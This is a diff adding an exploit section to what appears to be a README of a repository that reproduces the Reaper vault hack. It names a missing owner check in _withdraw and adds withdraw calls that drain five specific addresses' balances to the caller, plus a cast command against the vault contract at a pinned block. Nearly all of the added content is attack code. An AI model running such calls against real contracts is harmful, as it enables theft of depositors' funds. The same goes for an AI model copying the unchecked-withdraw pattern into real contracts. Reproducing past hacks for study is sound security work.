@@ -20,6 +20,20 @@ function _withdraw(uint256 assets, uint256 shares, address receiver, address own
 
 no validation on msg.sender == owner == rekt
 
+Exploit:
+```bash
+reaper.withdraw(reaper.maxWithdraw(0xEB7a12fE169C98748EB20CE8286EAcCF4876643b), address(this), 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b);
+reaper.withdraw(reaper.maxWithdraw(0x056abd53a55C187d738B4A982D36b4dFa506326A), address(this), 0x056abd53a55C187d738B4A982D36b4dFa506326A);
+reaper.withdraw(reaper.maxWithdraw(0x954773dD09a0bd708D3C03A62FB0947e8078fCf9), address(this), 0x954773dD09a0bd708D3C03A62FB0947e8078fCf9);
+reaper.withdraw(reaper.maxWithdraw(0xB573f01f2901c0dB3E14Ec80C6E12e4868DEC864), address(this), 0xB573f01f2901c0dB3E14Ec80C6E12e4868DEC864);
+reaper.withdraw(reaper.maxWithdraw(0xfc83DA727034a487f031dA33D55b4664ba312f1D), address(this), 0xfc83DA727034a487f031dA33D55b4664ba312f1D);
+```
+
+Exploit with cast:
+```bash
+cast call --rpc-url $RPC --block 44000000 0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A "withdraw(uint256, address, address)" 272475965085592826065349 0x328eBc7bb2ca4Bf4216863042a960E3C64Ed4c10 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b | cast 2d
+```
+
 files: 
 test/ReaperHack.t.sol - main foundry exploit testcase
 
